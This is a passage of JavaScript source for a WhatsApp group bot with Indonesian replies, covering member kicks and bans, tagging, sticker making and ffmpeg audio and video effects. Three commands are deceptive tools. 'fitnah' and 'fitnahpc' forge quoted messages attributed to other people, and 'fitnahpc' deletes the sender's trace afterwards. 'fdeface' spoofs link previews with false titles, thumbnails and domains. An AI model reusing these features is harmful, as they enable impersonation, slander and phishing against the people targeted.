if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return jawab('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
if(dev.message.extendedTextMessage === ownerNumber[0]) return reply('Tidak bisa kick owner')
reply( `*Modar kena kick awokawok* 🤣`);
await xdev.groupRemove(from, [asu])
aw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   xdev.sendMessage(from, aw, sticker)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					reply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					xdev.groupRemove(from, [asu])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 2500)
					setTimeout( () => {
					reply('Perintah diterima kak 😃')
					}, 0)
					} else {
if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa kick owner group`)
uw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   xdev.sendMessage(from, uw, sticker)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					reply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					 xdev.groupRemove(from, [mentioned[0]])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 2500)
					setTimeout( () => {
					reply('Perintah diterima kak 😃')
					}, 0)
                    }
                     break    




			       
					



case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
linkgc = await xdev.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
xdev.sendMessage(from, yeh, text, { quoted: dev })
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
                    }
if (args[0] === 'open') {
xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
                 break;


case 'setdesc':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
xdev.groupUpdateDescription(from, `${args.join(" ")}`)
break

case 'setnamegc':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
xdev.groupUpdateSubject(from, `${args.join(" ")}`)
xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
break

case 'demote':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
xdev.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'promote':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
xdev.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'revoke':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
xdev.revokeInvite(from)
reply('_Success_')
break


                    
                


     





    case 'kontag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join(" ")
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await xdev.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await xdev.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
    
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
    
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
            case 'hode':
  if(!isQuotedAudio) return reply('Reply audionya')
            reply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
						fs.unlinkSync(ran)
					})
				break
            
            case 'ghost':
if(!isQuotedAudio) return reply('Reply audionya')
            reply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return reply('Error!')
					buffer453 = fs.readFileSync(ran)
					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
                    fs.unlinkSync(ran)
				    })
		            break


case 'nightcore':
if(!isQuotedAudio) return reply('Reply audionya')
reply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					   })
				       break



case 'tupai':
if(!isQuotedAudio) return reply('Reply audionya')
				reply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					})
				break





case 'imut':
if(!isQuotedAudio) return reply('Reply audionya')
reply(mess.wait)
	encmedia3 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	masa = await xdev.downloadAndSaveMediaMessage(encmedia3)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return reply('Error!')
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
fs.unlinkSync(ran)})
break

            
            
     case 'addrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
          if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return reply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          reply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      case 'dellrespon':
      case 'delrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
            if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(body.slice(11), commandsDB)) return reply(`Key tersebut tidak ada di database`)
          deleteCommands(body.slice(11), commandsDB)
          reply(`Berhasil menghapus respon dengan key ${body.slice(11)}`)
          }
      break
      
      
      
   
      
      
           
		   case 'ban':
			if(!isOwner) return reply("Khusus Owner")
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply atau tag targetnya')
		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
            ban.push(asu) 
            fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
          reply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
        } else {
        if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa banned Owner`)
        if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa banned owner group`)
        
        ban.push(mentioned) 
        fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
          reply(`*Asik si wawan* @${mentioned[0].split('@')[0]} *kena banned* 🤣`);
        }
         break
                    
    
				
		
		
			
            
					
			case 'unban': //PERCOBAA
			if(!isOwner) return reply("Khusus Owner")
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
					
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
            ban.splice(asu, 1)
            fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
          reply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
        } else {
        if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa banned Owner`)
        if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa banned owner group`)
        ban.splice(mentioned, 1)
        fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
          reply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
        }
         break    




      
       
      
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          reply(txt)
          }
        break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    

case 'sc':
case 'sourchcode':
reply('Untuk Script ini masib blom di public kak, coba chat owner aku')
break

case 'style':
				  if(!q) return reply('Masukkan teks!')
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
			break
case 'pastebin':
if(!q) return reply(`Example : X - Dev Bot`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   xdev.sendMessage(from, `${yamete.result}`, text, {quoted: ftroli})
                     break
    case 'anime1':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await xdev.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await xdev.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (!q) return fakestatus('Isi teksnya!')
            xdev.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await xdev.downloadMediaMessage(swsw)
            xdev.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            xdev.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await xdev.downloadMediaMessage(swsw)
            xdev.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            xdev.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anus = {
        	detectLinks: false
    		}
    		var mat = await xdev.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		xdev.sendMessage(from, mat, MessageType.extendedText, anus)
            break

		case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
					case 'dellstik':
					if(!dev.key.fromMe & !isOwner) return reply('Only owner')
					if (!q) return reply(mess.wrongFormat)
					try {
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						setiker.splice(q,1)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						reply(`Succes delete sticker ${q}!`)
					} catch (err) {
						reply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
							case 'addimg':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: dev})
				break
				
				
				case 'delimg':
				if (!isOwner) return 
					try {
					 nmm = body.slice(8)
					 wanu = imagenye.indexOf(nmm)
					 imagenye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/foto/${nmm}.jpeg`)
					 sendFakeStatus(from, 'Sukses', fake)
					} catch (err){
						console.log(err)
						reply('error kak')
					}
					break
				
				case 'addvid':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: dev })
				break
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
